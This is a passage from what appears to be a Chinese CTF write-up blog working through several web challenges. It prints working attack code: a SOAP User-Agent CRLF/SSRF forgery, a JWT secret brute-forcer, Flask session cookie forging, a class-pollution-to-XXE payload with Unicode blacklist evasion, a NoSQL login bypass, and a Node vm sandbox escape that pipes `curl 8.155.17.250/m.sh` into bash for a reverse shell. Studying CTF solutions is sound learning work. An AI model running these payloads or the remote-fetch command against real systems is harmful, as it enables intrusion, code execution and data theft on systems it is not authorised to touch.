class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Hacker&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没想到被h4d333333.php中的echo file_get_contents(“result”);误导了，以为传ssrf会有回显，结果传完啥都没有就没尝试了。<br>其实直接读result文件就可以，echo file_get_contents当不存在就好<br>原理是soap传递时，UA如果可控。就可以伪造HTTP包进行SSRF和CRLF攻击。<br>自己写的soap UA伪造</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$location</span> = <span class="string">&quot;http://127.0.0.1/calculator.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = <span class="string">&quot;expression=system(&#x27;cat /flag&#x27;)&quot;</span>;</span><br><span class="line"><span class="variable">$headers</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;Authorization: Basic YWFhYWFhYWFhYWFhZG1pbjppX3dhbnRfdG9fZ2V0STAwX2luTXlUM3N0&quot;</span>,</span><br><span class="line">);</span><br><span class="line"><span class="comment">#$user_agent = &quot;hatchet\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot; . (string) strlen($data) . &quot;\r\n&quot;</span></span><br><span class="line"><span class="variable">$user_agent</span> = <span class="string">&quot;hatchet\r\n\r\n\r\n\r\n\r\nPOST /calculator.php HTTP/1.1\r\nHost: 127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: &quot;</span> . (<span class="keyword">string</span>) <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>) . <span class="string">&quot;\r\n&quot;</span></span><br><span class="line">    . <span class="title function_ invoke__">join</span>(<span class="string">&quot;\r\n&quot;</span>, <span class="variable">$headers</span>)</span><br><span class="line">    . <span class="string">&quot;\r\n\r\n&quot;</span> . <span class="variable">$data</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$user_agent</span>);</span><br></pre></td></tr></table></figure><p>真简单啊</p><h2 id="py-game（复现）">py_game（复现）</h2><p>用flask-unsign可以预先跑一遍字典爆破secret_key（可以排除一些弱口令）</p><p>个人爆破jwt脚本</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">token = <span class="string">&quot;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJRaW5nd2FuIiwibmFtZSI6InVzZXIiLCJhZG1pbiI6ImZhbHNlIn0.gzCFCz2Hw5c_EIjcM2lQ2QL3aDW3rAAHU2ZQ50_tnY4&quot;</span>  <span class="comment"># 题目中的 token</span></span><br><span class="line">password_file = <span class="string">&quot;./crypto/wordlist.txt&quot;</span>  <span class="comment"># 枚举密码字典文件</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> file:</span><br><span class="line">        line = line.strip()  <span class="comment"># 去除每行后面的换行</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            jwt.decode(</span><br><span class="line">                token, verify=<span class="literal">True</span>, key=line, algorithms=<span class="string">&quot;HS256&quot;</span></span><br><span class="line">            )  <span class="comment"># 设置编码方式为 HS256  ！这里自行更改</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> (</span><br><span class="line">            jwt.exceptions.ExpiredSignatureError,</span><br><span class="line">            jwt.exceptions.InvalidAudienceError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.InvalidIssuedAtError,</span><br><span class="line">            jwt.exceptions.ImmatureSignatureError,</span><br><span class="line">        ):  <span class="comment"># 出现这些错误，虽然表示过期之类的错误，但是密钥是正确的</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;key: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:  <span class="comment"># 签名错误则表示密钥不正确</span></span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;Failed: &quot;</span>, line.decode(<span class="string">&quot;ascii&quot;</span>))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Found.&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>flask-unsign使用decodeflask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8' --secret 'CHANGEME'爆破密钥flask-unsign --unsign --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM'encodeflask-unsign --sign --cookie &quot;&#123;'logged_in': True&#125;&quot; --secret 'CHANGEME'</code></pre><p>使用flask-unsign</p><pre><code>flask-unsign --unsign --cookie 'eyJfZmxhc2hlcyI6W3siIHQiOlsic3VjY2VzcyIsIlx1NzY3Ylx1NWY1NVx1NjIxMFx1NTI5ZiJdfV0sInVzZXJuYW1lIjoiMSJ9.Z0QnHQ.r92N4qr203gikX6xYAsl3DCtowM'</code></pre><p>跑出密钥值为a123456。伪造cookie为admin</p><pre><code>flask-unsign --sign --cookie &quot;&#123;'_flashes': [('success', '登录成功')], 'username': 'admin'&#125;&quot; --secret 'a123456'</code></pre><p>admin页面有源码下载，反编译为 <a href="http://app.py">app.py</a></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># visit https://tool.lu/pyc/ for more information</span></span><br><span class="line"><span class="comment"># Version: Python 3.6</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, flash, redirect, url_for, session, Response, send_file, jsonify</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;a123456&#x27;</span></span><br><span class="line">app.config[<span class="string">&#x27;xml_data&#x27;</span>] = <span class="string">&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;GeekChallenge2024&gt;&lt;EventName&gt;Geek Challenge&lt;/EventName&gt;&lt;Year&gt;2024&lt;/Year&gt;&lt;Description&gt;This is a challenge event for geeks in the year 2024.&lt;/Description&gt;&lt;/GeekChallenge2024&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, username, password</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = username</span><br><span class="line">        <span class="variable language_">self</span>.password = password</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>]:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">admin = User(<span class="string">&#x27;admin&#x27;</span>, <span class="string">&#x27;123456j1rrynonono&#x27;</span>)</span><br><span class="line">Users = [</span><br><span class="line">    admin]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">                update(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">isinstance</span>(v, <span class="built_in">dict</span>):</span><br><span class="line">            update(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.username == username:</span><br><span class="line">                flash(<span class="string">&#x27;用户名已存在&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        new_user = User(username, password)</span><br><span class="line">        Users.append(new_user)</span><br><span class="line">        flash(<span class="string">&#x27;注册成功！请登录&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">register = app.route(<span class="string">&#x27;/register&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(register)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username = request.form[<span class="string">&#x27;username&#x27;</span>]</span><br><span class="line">        password = request.form[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> u <span class="keyword">in</span> Users:</span><br><span class="line">            <span class="keyword">if</span> u.check(&#123;</span><br><span class="line">                <span class="string">&#x27;username&#x27;</span>: username,</span><br><span class="line">                <span class="string">&#x27;password&#x27;</span>: password &#125;):</span><br><span class="line">                session[<span class="string">&#x27;username&#x27;</span>] = username</span><br><span class="line">                flash(<span class="string">&#x27;登录成功&#x27;</span>, <span class="string">&#x27;success&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;dashboard&#x27;</span>))</span><br><span class="line">        </span><br><span class="line">        flash(<span class="string">&#x27;用户名或密码错误&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span>(<span class="string">&#x27;login.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">login = app.route(<span class="string">&#x27;/login&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(login)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;/app/templates/play.html&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;utf-8&#x27;</span>, **(<span class="string">&#x27;encoding&#x27;</span>,)) <span class="keyword">as</span> file:</span><br><span class="line">            play_html = file.read()</span><br><span class="line">        <span class="keyword">return</span> play_html</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">play = app.route(<span class="string">&#x27;/play&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(play)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;admin.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], **(<span class="string">&#x27;username&#x27;</span>,))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;你没有权限访问&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">admin = app.route(<span class="string">&#x27;/admin&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(admin)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">downloads321</span>():</span><br><span class="line">    <span class="keyword">return</span> send_file(<span class="string">&#x27;./source/app.pyc&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;as_attachment&#x27;</span>,))</span><br><span class="line"></span><br><span class="line">downloads321 = app.route(<span class="string">&#x27;/downloads321&#x27;</span>)(downloads321)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line">index = app.route(<span class="string">&#x27;/&#x27;</span>)(index)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dashboard</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session:</span><br><span class="line">        is_admin = session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> is_admin:</span><br><span class="line">            user_tag = <span class="string">&#x27;Admin User&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            user_tag = <span class="string">&#x27;Normal User&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;dashboard.html&#x27;</span>, session[<span class="string">&#x27;username&#x27;</span>], user_tag, is_admin, **(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;tag&#x27;</span>, <span class="string">&#x27;is_admin&#x27;</span>))</span><br><span class="line">    <span class="literal">None</span>(<span class="string">&#x27;请先登录&#x27;</span>, <span class="string">&#x27;error&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line">dashboard = app.route(<span class="string">&#x27;/dashboard&#x27;</span>)(dashboard)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">xml_parse</span>():</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        xml_bytes = app.config[<span class="string">&#x27;xml_data&#x27;</span>].encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        parser = etree.XMLParser(<span class="literal">True</span>, <span class="literal">True</span>, **(<span class="string">&#x27;load_dtd&#x27;</span>, <span class="string">&#x27;resolve_entities&#x27;</span>))</span><br><span class="line">        tree = etree.fromstring(xml_bytes, parser, **(<span class="string">&#x27;parser&#x27;</span>,))</span><br><span class="line">        result_xml = etree.tostring(tree, <span class="literal">True</span>, <span class="string">&#x27;utf-8&#x27;</span>, <span class="literal">True</span>, **(<span class="string">&#x27;pretty_print&#x27;</span>, <span class="string">&#x27;encoding&#x27;</span>, <span class="string">&#x27;xml_declaration&#x27;</span>))</span><br><span class="line">        <span class="keyword">return</span> Response(result_xml, <span class="string">&#x27;application/xml&#x27;</span>, **(<span class="string">&#x27;mimetype&#x27;</span>,))</span><br><span class="line">        <span class="keyword">except</span> etree.XMLSyntaxError:</span><br><span class="line">            e = <span class="literal">None</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">str</span>(e)</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                <span class="keyword">del</span> e</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xml_parse = app.route(<span class="string">&#x27;/xml_parse&#x27;</span>)(xml_parse)</span><br><span class="line">black_list = [</span><br><span class="line">    <span class="string">&#x27;__class__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__init__&#x27;</span>.encode(),</span><br><span class="line">    <span class="string">&#x27;__globals__&#x27;</span>.encode()]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="built_in">print</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="built_in">print</span>(i)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update_route</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;username&#x27;</span> <span class="keyword">in</span> session <span class="keyword">and</span> session[<span class="string">&#x27;username&#x27;</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> request.data:</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">&#x27;NONONO, Bad Hacker&#x27;</span>, <span class="number">403</span>)</span><br><span class="line">                data = <span class="literal">None</span>.loads(request.data.decode())</span><br><span class="line">                <span class="built_in">print</span>(data)</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">all</span>((<span class="keyword">lambda</span> <span class="number">.0</span>: <span class="keyword">pass</span>)(data.values())):</span><br><span class="line">                    update(data, User)</span><br><span class="line">                    <span class="keyword">return</span> (jsonify(&#123;</span><br><span class="line">                        <span class="string">&#x27;message&#x27;</span>: <span class="string">&#x27;更新成功&#x27;</span> &#125;), <span class="number">200</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                e = <span class="literal">None</span></span><br><span class="line">                </span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    <span class="keyword">return</span> (<span class="string">f&#x27;&#x27;&#x27;Exception: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&#x27;&#x27;&#x27;</span>, <span class="number">500</span>)</span><br><span class="line">                    e = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">del</span> e</span><br><span class="line">                <span class="keyword">return</span> (<span class="string">&#x27;No data provided&#x27;</span>, <span class="number">400</span>)</span><br><span class="line">                <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">update_route = app.route(<span class="string">&#x27;/update&#x27;</span>, [</span><br><span class="line">    <span class="string">&#x27;POST&#x27;</span>], **(<span class="string">&#x27;methods&#x27;</span>,))(update_route)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">80</span>, <span class="literal">False</span>, **(<span class="string">&#x27;host&#x27;</span>, <span class="string">&#x27;port&#x27;</span>, <span class="string">&#x27;debug&#x27;</span>))</span><br></pre></td></tr></table></figure><p>存在xml_parse路由，和update函数。很明显我们要打原型链污染xml_data从而进行xxe。<br>黑名单采用unicode编码绕过<br>POC:</p><pre><code>&#123;    &quot;__init__&quot;:&#123;        &quot;__globals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;config&quot;:&#123;                    &quot;xml_data&quot;:&quot;                        &lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;                        &lt;!DOCTYPE xxe [                        &lt;!ELEMENT name ANY &gt;                        &lt;!ENTITY admin SYSTEM &quot;/flag&quot; &gt;]&gt;                        &lt;user&gt;                        &lt;username&gt;&amp;admin;&lt;/username&gt;                        &lt;password&gt;123456&lt;/password&gt;                        &lt;/user&gt;                        &quot;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>用cyberchef的unicode escape编码<br>payload:</p><pre><code>&#123;    &quot;_\u005Finit__&quot;:&#123;        &quot;_\u005Fglobals__&quot;:&#123;            &quot;app&quot;:&#123;                &quot;config&quot;:&#123;                    &quot;xml_data&quot;:&quot;\u003C\u003F\u0078\u006D\u006C\u0020\u0076\u0065\u0072\u0073\u0069\u006F\u006E\u003D\u0022\u0031\u002E\u0030\u0022\u0020\u0065\u006E\u0063\u006F\u0064\u0069\u006E\u0067\u003D\u0022\u0075\u0074\u0066\u002D\u0038\u0022\u003F\u003E\u000A\u003C\u0021\u0044\u004F\u0043\u0054\u0059\u0050\u0045\u0020\u0078\u0078\u0065\u0020\u005B\u000A\u003C\u0021\u0045\u004C\u0045\u004D\u0045\u004E\u0054\u0020\u006E\u0061\u006D\u0065\u0020\u0041\u004E\u0059\u0020\u003E\u000A\u003C\u0021\u0045\u004E\u0054\u0049\u0054\u0059\u0020\u0061\u0064\u006D\u0069\u006E\u0020\u0053\u0059\u0053\u0054\u0045\u004D\u0020\u0022\u002F\u0066\u006C\u0061\u0067\u0022\u0020\u003E\u005D\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u003E\u000A\u003C\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u0026\u0061\u0064\u006D\u0069\u006E\u003B\u003C\u002F\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065\u003E\u000A\u003C\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u0031\u0032\u0033\u0034\u0035\u0036\u003C\u002F\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u003E\u000A\u003C\u002F\u0075\u0073\u0065\u0072\u003E&quot;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>在update路由传参，并在xml_parse收到flag</p><h2 id="noSandbox（复现）">noSandbox（复现）</h2><p>SQL采用了MongoDB<br><a href="https://xz.aliyun.com/t/9908">https://xz.aliyun.com/t/9908</a><br>用Nosql的永真式注入绕过登录</p><pre><code>&#123;&quot;username&quot;:&#123;&quot;$ne&quot;:1&#125;,&quot;password&quot;: &#123;&quot;$ne&quot;:1&#125;&#125;</code></pre><p>接下来给了execute路由执行js代码<br>考点是VM逃逸<br><a href="https://xz.aliyun.com/t/11859">https://xz.aliyun.com/t/11859</a><br>分析获得的app_part.js</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//泄露的代码执行和WAF部分代码,不能直接运行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">&#x27;vm&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">waf</span>(<span class="params">code,res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> pattern = <span class="regexp">/(find|ownKeys|fromCharCode|includes|\&#x27;|\&quot;|replace|fork|reverse|fs|process|\[.*?\]|exec|spawn|Buffer|\\|\+|concat|eval|Function|env)/m</span>;</span><br><span class="line">    <span class="keyword">if</span> (code.<span class="title function_">match</span>(pattern)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;WAF detected malicious code&#x27;</span>);</span><br><span class="line">        <span class="title function_">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&#x27;/execute&#x27;</span>, upload.<span class="title function_">none</span>(), <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> code = req.<span class="property">body</span>.<span class="property">code</span>;</span><br><span class="line">    <span class="keyword">const</span> token = req.<span class="property">cookies</span>.<span class="property">token</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!token) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Missing execution code credentials.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!jwt.<span class="title function_">verify</span>(token, <span class="variable constant_">JWT_SECRET</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.<span class="title function_">status</span>(<span class="number">403</span>).<span class="title function_">send</span>(<span class="string">&#x27;Invalid token provided.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Received code for execution: <span class="subst">$&#123;code&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="title function_">waf</span>(code,res);</span><br><span class="line">        <span class="keyword">let</span> sandbox = <span class="title class_">Object</span>.<span class="title function_">create</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="keyword">let</span> context = vm.<span class="title function_">createContext</span>(sandbox);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">let</span> script = <span class="keyword">new</span> vm.<span class="title class_">Script</span>(code);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Executing code in sandbox context&#x27;</span>);</span><br><span class="line">        script.<span class="title function_">runInContext</span>(context);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Code executed successfully. Result: <span class="subst">$&#123;sandbox.result || <span class="string">&#x27;No result returned.&#x27;</span>&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">json</span>(<span class="string">&#x27;Code executed successfully&#x27;</span> );</span><br><span class="line">    &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">`Error executing code: <span class="subst">$&#123;err.message&#125;</span>`</span>);</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">send</span>(<span class="string">`Error: there&#x27;s no display back here,may be it executed successfully?`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>使用`${}`绕过黑名单，利用官方题解总结</p><pre><code>process `$&#123;`$&#123;`proce`&#125;ss`&#125;`prototype `$&#123;`$&#123;`prototyp`&#125;e`&#125;`get_process `$&#123;`$&#123;`get_pro`&#125;cess`&#125;`require `$&#123;`$&#123;`requir`&#125;e`&#125;`execSync `$&#123;`$&#123;`exe`&#125;cSync`&#125;`return process `$&#123;`$&#123;`return proc`&#125;ess`&#125;`constructor `$&#123;`$&#123;`constructo`&#125;r`&#125;`child_process `$&#123;`$&#123;`child_proces`&#125;s`&#125;`</code></pre><p>payload:</p><pre><code>throw new Proxy(&#123;&#125;, &#123;get: function()&#123;const cc = arguments.callee.caller;const p = (cc.constructor.constructor(`$&#123;`$&#123;`return proc`&#125;ess`&#125;`))();chi=p.mainModule.require(`$&#123;`$&#123;`child_proces`&#125;s`&#125;`);res=Reflect.get(chi,`$&#123;`$&#123;`exe`&#125;cSync`&#125;`)(`curl 8.155.17.250/m.sh | bash`);return res.toString();&#125;&#125;)</code></pre><p>直接反弹shell即可</p><h2 